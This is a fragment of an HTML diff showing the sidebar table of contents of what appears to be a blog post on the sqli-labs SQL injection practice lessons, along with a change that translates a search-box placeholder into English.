class="nav-number">3.6.</span> <span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-7"><span class="nav-number">3.7.</span> <span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8"><span class="nav-number">3.8.</span> <span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9"><span class="nav-number">3.9.</span> <span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-10"><span class="nav-number">3.10.</span> <span class="nav-text">Less-10</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%88POST%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">题目（POST）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-11"><span class="nav-number">4.1.</span> <span class="nav-text">Less-11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A0%E6%99%AE%E9%80%9A%E8%81%94%E5%90%88-1"><span class="nav-number">4.1.1.</span> <span class="nav-text">①普通联合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A1%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="nav-number">4.1.2.</span> <span class="nav-text">②报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A2%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">4.1.3.</span> <span class="nav-text">③布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A3%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">4.1.4.</span> <span class="nav-text">④时间盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-12"><span class="nav-number">4.2.</span> <span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-13"><span class="nav-number">4.3.</span> <span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-14"><span class="nav-number">4.4.</span> <span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-15"><span class="nav-number">4.5.</span> <span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-16"><span class="nav-number">4.6.</span> <span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-17"><span class="nav-number">4.7.</span> <span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-18"><span class="nav-number">4.8.</span> <span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-19"><span class="nav-number">4.9.</span> <span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-20"><span class="nav-number">4.10.</span> <span class="nav-text">Less-20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-21"><span class="nav-number">4.11.</span> <span class="nav-text">Less-21</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-22"><span class="nav-number">4.12.</span> <span class="nav-text">Less-22</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
@@ -447,7 +714,7 @@
                 <input autocomplete="off"
                        autocorrect="off"
                        autocapitalize="off"
-                       placeholder="搜索..."
+                       placeholder="Search..."
                        spellcheck="false"
                        type="search"
                        class="search-input"
